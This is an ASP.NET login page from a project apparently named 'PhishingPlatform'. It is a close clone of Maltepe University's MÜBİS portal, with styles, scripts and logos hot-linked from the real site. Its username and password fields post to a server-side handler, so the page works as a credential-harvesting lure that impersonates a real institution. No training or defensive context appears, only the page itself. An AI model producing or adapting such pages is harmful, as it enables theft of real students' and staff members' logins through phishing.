<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Mubis.aspx.cs" Inherits="PhishingPlatform.PhishingEmails.Mubis" %>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <link rel="stylesheet" type="text/css" href="/DXR.axd?r=1_33,1_35,1_18-yEqCd" />
    <link rel="stylesheet" type="text/css" href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Editors/sprite.css" />
    <link rel="stylesheet" type="text/css" href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Editors/styles.css" />
    <title>
        Mübis Kullanıcı Girişi -
    </title>
    <link rel="SHORTCUT ICON" type="image/gif" href="https://mubis.maltepe.edu.tr/Images/200906_mudes.gif" />
    <script src="https://mubis.maltepe.edu.tr/JS/DilDestegi.js" type="03afea1cb7b230935c5976b8-text/javascript"></script>
    <script src="https://mubis.maltepe.edu.tr/JS/jquery.min.js" type="03afea1cb7b230935c5976b8-text/javascript"></script>
    <link href="https://mubis.maltepe.edu.tr/CSS/bayrak.css" rel="stylesheet" />
    <script src="https://mubis.maltepe.edu.tr/JS/jquery.facebox.js" type="03afea1cb7b230935c5976b8-text/javascript"></script>
    <script src="https://mubis.maltepe.edu.tr/JS/PublishUyari.js" type="03afea1cb7b230935c5976b8-text/javascript"></script>
    <link href="https://mubis.maltepe.edu.tr/CSS/facebox.css" rel="stylesheet" type="text/css" />
    <script src="https://mubis.maltepe.edu.tr/JS/jquery.meow.js" type="03afea1cb7b230935c5976b8-text/javascript"></script>
    <link href="https://mubis.maltepe.edu.tr/CSS/jquery.meow.css" rel="stylesheet" type="text/css" />
    <meta name="viewport" content="width=device-width, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/CardView/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/CardView/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Chart/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Demo/NavBarNavigation/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Demo/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Editors/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Editors/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/GridView/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/GridView/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/HtmlEditor/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/HtmlEditor/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/MubisWeb.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/PivotGrid/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/PivotGrid/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/RichEdit/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/RichEdit/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Scheduler/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Scheduler/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/SpellChecker/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Spreadsheet/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Spreadsheet/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/TreeList/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/TreeList/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Web/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/Web/styles.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/XtraReports/sprite.css" type="text/css" rel="stylesheet" />
    <link href="https://mubis.maltepe.edu.tr/App_Themes/Plastic%20Blue/XtraReports/styles.css" type="text/css" rel="stylesheet" />
</head>
<body>
    <form method="post" id="form1">
        
        <script src="https://mubis.maltepe.edu.tr/WebResource.axd?d=pynGkmcFUV13He1Qd6_TZDAGpe7TOylLjO6p-PvurKhYXipLwzGFIqkLqoR6xzNJrraUyYEbegLOCJagyEgv4Q2&t=638346665325447473" type="03afea1cb7b230935c5976b8-text/javascript"></script>
        <script src="https://mubis.maltepe.edu.tr/ScriptResource.axd?d=NJmAwtEo3Ipnlaxl6CMhvsBajycsyYIV1v94NNiRiabsuSwgk7osn-1Leq2mC4QScunyypmiAFOjMBwgFEaC2JodteUf84IeTnSXAFMHEUGbdfDDAlSjqFWCwOjKnhlMvVzKNfq-PQF7pamyYEGCyUgAGjzrH_VtBFt3W-pjfeo1&t=20e3ff6b" type="03afea1cb7b230935c5976b8-text/javascript"></script>
        <script src="https://mubis.maltepe.edu.tr/ScriptResource.axd?d=dwY9oWetJoJoVpgL6Zq8OKhPqGffVkaKmDSK2VCcj_F2WFsJvmYAVJp3ZDYEp52gxKcg2jBWu0IlAjCsfVnv_TACmrWXpo9i3-jX_DZCGZF92zQkxpUpOeFPBUqwvKK1Cgaud6OkcoMMk32zcR-E1o3ZmdANzrl1EfzMnpp-YT41&t=20e3ff6b" type="03afea1cb7b230935c5976b8-text/javascript"></script>
        
        <style type="text/css">
            i {
                font-size: 75%;
                display: block;
            }

            body {
                font-family: Tahoma;
                text-align: left;
            }

            #back {
                background-color: #FFA100;
                border-radius: 10px 10px 10px 10px;
                box-shadow: 5px 5px 5px #888888;
                min-width: 320px;
                width: 100%;
                max-width: 400px;
                height: 625px;
                margin-left: auto;
                margin-right: auto;
                padding: 5px;
            }

            #login_panel {
                margin-top: 30px;
                margin: 30px auto 0 auto;
                width: 80%;
                height: 390px;
                padding: 10px;
                position: inherit;
                text-shadow: 1px 1px 3px #000;
                background: #191919;
                border: 2px solid transparent;
                -webkit-border-radius: 10px;
                -khtml-border-radius: 10px;
                -moz-border-radius: 10px;
                -ms-border-radius: 10px;
                -o-border-radius: 10px;
                border-radius: 10px;
                -webkit-opacity: 0.75;
                -khtml-opacity: 0.75;
                -moz-opacity: 0.75;
                -ms-opacity: 0.75;
                -o-opacity: 0.75;
                opacity: 0.75;
                zoom: 1;
                -webkit-box-shadow: 2px 2px 10px rgba(25, 25, 25, 0.25);
                -khtml-box-shadow: 2px 2px 10px rgba(25, 25, 25, 0.25);
                -moz-box-shadow: 2px 2px 10px rgba(25, 25, 25, 0.25);
                -ms-box-shadow: 2px 2px 10px rgba(25, 25, 25, 0.25);
                -o-box-shadow: 2px 2px 10px rgba(25, 25, 25, 0.25);
                box-shadow: 2px 2px 10px rgba(25, 25, 25, 0.25);
            }

            #alt_bilgi {
                position: inherit;
                margin-top: 15px;
                color: White;
                font-family: Tahoma;
                font-size: 22px;
                font-weight: bold;
                text-align: center;
            }

            #ust_bilgi {
                position: relative;
                top: 15px;
                color: #9E1E88;
                font-family: Tahoma;
                font-size: 15px;
                font-weight: bold;
                text-align: center;
                line-height: 20px;
            }

            .uyari {
                font-size: 12px;
                font-weight: normal;
                color: White;
                margin-bottom: 10px;
            }

            .dokuman {
                font-size: 12px;
                font-weight: normal;
                color: White;
                margin-top: 10px;
            }

            .etiket {
                font-size: 14px;
                font-weight: bold;
                color: White;
                width: 120px;
            }

            .dugme {
                padding-right: 29px;
            }

            a {
                font-size: 12px;
                font-weight: bold;
                color: White;
                text-decoration: none;
            }

            .dokuman table td {
                vertical-align: top;
                text-align: center;
                border-right: solid 1px gray;
            }

                .dokuman table td:last-child {
                    text-align: center;
                    border-right: solid 0px gray;
                }
        </style>
        <img id="Image1" />
        <div style="position:fixed; width:100%;height
        :100%;overflow:scroll; z-index:0">
            <table style="width:100%; height:100%;">
                <tr>
                    <td style="vertical-align:middle;">
                        <div id="back">
                            <div id="ust_bilgi">
                                <table style="width: 100%;">
                                    <tr style="width: 86%">
                                        <td> <img src="https://mubis.maltepe.edu.tr/Images/yeni_logo.png" style="border-width: 0px; width: 100%;" /></td>
                                        <td style="width: 26px;vertical-align: top">
                                        </td>
                                        <td style="width: 1px;vertical-align: top"></td>
                                    </tr>
                                </table>
                                MÜBİS
                                <br />
                                MALTEPE ÜNİVERSİTESİ BİLİŞİM SİSTEMİ<br />
                                <i> MALTEPE UNIVERSITY INFORMATION SYSTEM </i>
                            </div>
                            <div id="login_panel" style="height:auto">
                                <div class="uyari">
                                    Kullanıcı adı ve parola; öğrenci için öğrenci numarası ve tek şifre, Öğretim elemanı için bilgisayarını açarken kullandığı kullanıcı adı ve parolasıdır. <br />
                                    <i>
                                        For students, the user name is the student number.
                                        For others, the user name is the e-mail address.
                                    </i>
                                </div>
                                <form id="form3" runat="server">
                                    <table cellpadding="0" cellspacing="0">
                                        <tbody>
                                            <tr>
                                                <td align="right" class="etiket">
                                                    Kullanıcı Adı
                                                    <i> User Name </i>
                                                </td>
                                                <td>
                                                    
                                                    <table id="txtKullaniciAdi_ET" class="dxeValidStEditorTable dxeRoot_PlasticBlue" style="margin:2px;">
                                                        <tr>
                                                            <td id="txtKullaniciAdi_CC" class="dxeErrorFrame_PlasticBlue dxeErrorFrameSys dxeControlsCell_PlasticBlue dx-wrap" style="color:Red;border-color:#FD4D3E;border-width:1px;border-style:Solid;border-right-width:0px;padding-left:0px;padding-right:0px;padding-top:0px;padding-bottom:0px;vertical-align:middle;">
                                                                <table title="Kullanıcı adı ve parola; öğrenci için öğrenci numarası ve tek şifre, Öğretim elemanı için bilgisayarını açarken kullandığı kullanıcı adı ve parolasıdır." class="dxeTextBoxSys dxeTextBox_PlasticBlue dxeTextBoxDefaultWidthSys" id="txtKullaniciAdi" style="height:20px;width:170px; ">
                                                                    <tr>
                                                                        <td class="dxic" style="width:100%;padding-left:5px;padding-right:5px;padding-top:5px;padding-bottom:5px; "><input class="dxeEditArea_PlasticBlue dxeEditAreaSys" style="border-color:transparent;" id="txtKullaniciAdi_I" name="txtKullaniciAdi" onfocus="if (!window.__cfRLUnblockHandlers) return false; ASPx.EGotFocus(&#39;txtKullaniciAdi&#39;)" onblur="if (!window.__cfRLUnblockHandlers) return false; ASPx.ELostFocus(&#39;txtKullaniciAdi&#39;)" onchange="if (!window.__cfRLUnblockHandlers) return false; ASPx.EValueChanged(&#39;txtKullaniciAdi&#39;)" type="text" data-cf-modified-03afea1cb7b230935c5976b8- /></td>
                                                                    </tr>
                                                                </table>
                                                            </td>
                                                            <td id="txtKullaniciAdi_EC" class="dxeErrorCell_PlasticBlue dxeErrorFrame_PlasticBlue dxeErrorFrameSys dxeErrorCellSys dx-wrap" style="color:Red;border-color:#FD4D3E;border-width:1px;border-style:Solid;border-left-width:0px;padding-right:3px;vertical-align:middle;visibility:hidden;">
                                                                <table style="width:100%;">
                                                                    <tr>
                                                                        <td><img id="txtKullaniciAdi_EI" class="dxEditors_edtError_PlasticBlue" src="https://mubis.maltepe.edu.tr/DXR.axd?r=1_37-yEqCd" alt /></td>
                                                                    </tr>
                                                                </table>
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td align="right" class="etiket">
                                                    Parola
                                                    <i> Password </i>
                                                </td>
                                                <td>
                                                    <table id="txtSifre_ET" class="dxeValidStEditorTable dxeRoot_PlasticBlue" style="margin:2px;">
                                                        <tr>
                                                            <td id="txtSifre_CC" class="dxeErrorFrame_PlasticBlue dxeErrorFrameSys dxeControlsCell_PlasticBlue dx-wrap" style="color:Red;border-color:#FD4D3E;border-width:1px;border-style:Solid;border-right-width:0px;padding-left:0px;padding-right:0px;padding-top:0px;padding-bottom:0px;vertical-align:middle;">
                                                                <table title="Kullanıcı adı ve parola; öğrenci için öğrenci numarası ve tek şifre, Öğretim elemanı için bilgisayarını açarken kullandığı kullanıcı adı ve parolasıdır."  class="dxeTextBoxSys dxeTextBox_PlasticBlue dxeTextBoxDefaultWidthSys" id="txtSifre" style="width:170px;">
                                                                    <tr>
                                                                        <td class="dxic" style="width:100%;padding-left:5px;padding-right:5px;padding-top:5px;padding-bottom:5px;"><input class="dxeEditArea_PlasticBlue dxeEditAreaSys" style="border-color:transparent" id="txtSifre_I" name="txtSifre" onfocus="if (!window.__cfRLUnblockHandlers) return false; ASPx.EGotFocus(&#39;txtSifre&#39;)" onblur="if (!window.__cfRLUnblockHandlers) return false; ASPx.ELostFocus(&#39;txtSifre&#39;)" onchange="if (!window.__cfRLUnblockHandlers) return false; ASPx.EValueChanged(&#39;txtSifre&#39;)" type="password"/></td>
                                                                    </tr>
                                                                </table>
                                                            </td>
                                                            <td id="txtSifre_EC" class="dxeErrorCell_PlasticBlue dxeErrorFrame_PlasticBlue dxeErrorFrameSys dxeErrorCellSys dx-wrap" style="color:Red;border-color:#FD4D3E;border-width:1px;border-style:Solid;border-left-width:0px;padding-right:3px;vertical-align:middle;visibility:hidden;">
                                                                <table style="width:100%;">
                                                                    <tr>
                                                                        <td><img id="txtSifre_EI" class="dxEditors_edtError_PlasticBlue" src="https://mubis.maltepe.edu.tr/DXR.axd?r=1_37-yEqCd" alt /></td>
                                                                    </tr>
                                                                </table>
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </td>
                                            </tr>
                                            <tr>
                                            </tr>
                                            <tr>
                                                <td></td>
                                                <td align="right" class="dugme">
                                                    <div class=" dxbButtonSys dxbTSys" id="btnGiris" style="margin:2px;-webkit-user-select:none;">
                                                        <div>
                                                            <div>
                                                                <asp:Button ID="btnGirisServer" runat="server" Text="Giriş / Login" OnClick="btnGirisServer_Click" />
                                                            </div>
                                                        </div>
                                                    </div>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </form>
                                <div class="dokuman">
                                    <table style="width: 100%;">
                                        <tr>
                                            <td style="width:50%;">
                                                <a href="KUDES/Sso/ParolamiUnuttum.aspx" target="_blank">
                                                    <img src="https://mubis.maltepe.edu.tr/Images/Help.png" style="border-width: 0;" /><br />
                                                    Öğrenci Parolamı Unuttum <br /> <i> Forgot my password </i>
                                                </a>
                                            </td>
                                            <td style="width: 50%;">
                                                <a href="/KUDES/Personel/PersonelSifreSifirlama.aspx" target="_blank">
                                                    <img src="https://mubis.maltepe.edu.tr/Images/Help.png" style="border-width: 0;" /><br />
                                                    Personel Parolamı Sıfırla<br /> <i> Reset Staff Password </i>
                                                </a>
                                                <a href="http://yardim.maltepe.edu.tr/" target="_blank" style="display: none;">
                                                    <img src="https://mubis.maltepe.edu.tr/Images/help-browser.png" style="border-width: 0; display: none; " />
                                                    <br />
                                                    Kullanıcı Klavuzu<br /> <i> User Guide </i>
                                                </a>
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                            </div>
                            <div id="Div1" style="text-align: center; padding: 30px 98px">
                                <table style="width: 100%;">
                                    <tr>
                                        <td>
                                            <a href="https://www.facebook.com/maltepeuniversitesi" target="_blank">
                                                <img src="https://mubis.maltepe.edu.tr/Images/iconfinder_facebook_circle_294710.png" width="28" style="border-width: 0;" />
                                            </a>
                                        </td>
                                        <td>
                                            <a href="https://twitter.com/MaltepeEduTr" target="_blank">
                                                <img src="https://mubis.maltepe.edu.tr/Images/iconfinder_twitter_circle_294709.png" width="28" style="border-width: 0;" />
                                            </a>
                                        </td>
                                        <td>
                                            <a href="https://instagram.com/maltepeedutr/" target="_blank" target="_blank">
                                                <img src="https://mubis.maltepe.edu.tr/Images/iconfinder_social-instagram-new-circle_1164349.png" width="28" style="border-width: 0;" />
                                            </a>
                                        </td>
                                        <td>
                                            <a href="https://www.linkedin.com/edu/maltepe-%C3%BCniversitesi-17381" target="_blank">
                                                <img src="https://mubis.maltepe.edu.tr/Images/iconfinder_linkedin_1632521%20(2).png" width="28" style="border-width: 0;" />
                                            </a>
                                        </td>
                                        <td>
                                            <a href="https://www.youtube.com/channel/UCzqORMYj3JH533lJFXbvjDQ" target="_blank">
                                                <img src="https://mubis.maltepe.edu.tr/Images/iconfinder_youtube_1632538%20(2).png" width="28" style="border-width: 0;" />
                                            </a>
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
        <div id="tarayici_bildir" style="display: none;">
            <table align="center" style="margin: 10px;">
                <tr>
                    <td align="center">
                        Tarayıcınızın sürümü geri kalmış görünüyor, Mübis tarayıcızı Mozilla Firefox ile
                        güncellemenizi tavsiye eder.
                    </td>
                </tr>
                <tr>
                    <td align="center">
                        <a href="http://www.mozilla.org/firefox" target="_blank">
                            <img src="https://mubis.maltepe.edu.tr/Images/firefox.png" alt="Firefox" style="border-width: 0;"/>
                        </a>
                    </td>
                </tr>
            </table>
        </div>
        <div id="chrome_kullanma" style="display: none;">
            <table align="center" style="margin: 10px;">
                <tr>
                    <td align="center">
                        MÜBİS chrome tarayıcısını desteklememektedir, tarayıcı olarak Mozilla Firefox kullanmanızı
                        tavsiye eder.
                    </td>
                </tr>
                <tr>
                    <td align="center">
                        <a href="http://www.mozilla.org/firefox" target="_blank">
                            <img src="https://mubis.maltepe.edu.tr/Images/firefox.png" alt="Firefox" style="border-width: 0;"/>
                        </a>
                    </td>
                </tr>
            </table>
        </div>
    </form>
</body>
</html>



